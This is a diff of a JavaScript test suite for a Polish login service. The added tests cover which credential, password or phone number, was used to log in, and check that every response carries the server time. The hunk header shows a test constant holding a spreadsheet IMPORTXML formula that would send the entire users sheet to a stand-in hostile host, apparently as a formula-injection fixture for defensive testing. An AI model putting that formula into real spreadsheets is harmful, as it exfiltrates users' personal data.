@@ -75,6 +75,8 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('logowanie hasłem', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).imie === 'Jan Testowy');
   ok('konto z hasłem nie wpuszcza telefonem', /ustawione haslo/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).opis));
   ok('konto bez hasła wpuszcza telefonem', B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).status === 'ok');
+  ok('logowanie mówi, czym weszło (klient zakłada sejf tą samą postacią hasła)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).przez === 'haslo' && B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).przez === 'telefon');
+  ok('każda odpowiedź, także odmowa, niesie czas serwera (poprawka zegara urządzenia)', [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }), B.post({ akcja: 'nieznana', kod: '12345' }), B.post({ akcja: 'puls', kod: '12345' })].every(o => Math.abs(o.czas_serwera - Date.now() / 1000) < 5));
   ok('ustawienie własnego hasła telefonem (konto bez hasha)', B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'mojehaslo9' }).status === 'ok' && B.post({ akcja: 'logowanie', kod: '22222', haslo: 'mojehaslo9' }).status === 'ok');
   ok('zmiana hasła dotychczasowym hasłem', B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: 'haslo123', nowe_haslo: 'nowehaslo1' }).status === 'ok' && B.post({ akcja: 'logowanie', kod: '12345', haslo: 'nowehaslo1' }).status === 'ok');
   ok('telefon nie podmienia hasła na koncie, które je ma', B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: '600100200', nowe_haslo: 'przejete123' }).status === 'blad');
